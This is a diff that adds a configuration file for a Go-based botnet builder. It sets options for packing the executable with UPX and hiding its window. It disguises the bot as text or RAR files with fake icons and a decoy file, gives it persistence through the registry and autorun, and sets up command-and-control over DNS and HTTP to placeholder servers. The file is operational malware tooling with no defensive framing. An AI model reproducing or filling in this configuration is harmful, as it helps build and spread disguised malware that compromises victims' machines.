@@ -1,0 +1,50 @@
+#GO BOT Config
+
+[buildconf]
+gobotnetPath = "C:/Go/src/github.com/gobotnet/"
+buildFlags = "-ldflags \"-w -s -H=windowsgui\""
+readyFolder = "ready/"   
+upxPath = "C:/upx391w/upx.exe"
+ffFolderPath = ""
+icoFolderPath = ""
+ffarray = [
+	"fakefiles/test.txt",
+	"fakefiles/test.rar"
+	]
+icoarray = [
+	"icons/text.ico",
+	"icons/rar.ico"
+	]
+rsrcPath = "C:/Go/src/github.com/gobotnet/client/utils/rsrc.exe"
+sysoName = "main.syso"
+defaultExeName = "asocialfriend.exe"
+copyNameFromFF = true
+
+[variables]
+usingDNS = true
+usingHTTP = true
+rewriteExe = true
+launchFakeFile = true  
+usingRegistry  = true
+usingAutorun   = true                           
+debugMode      = false                         
+attemptCount   = 1
+dnsAddress     = "your-site.com"
+winHttpTimeout = [
+	0, 
+	60000, 
+	30000, 
+	30000
+]
+firstInterface = "HTTP"
+
+[servers]
+urls = [
+	"127.0.0.1", 
+	"your-site.com"
+]
+
+ports = [
+	80,
+	8090
+]
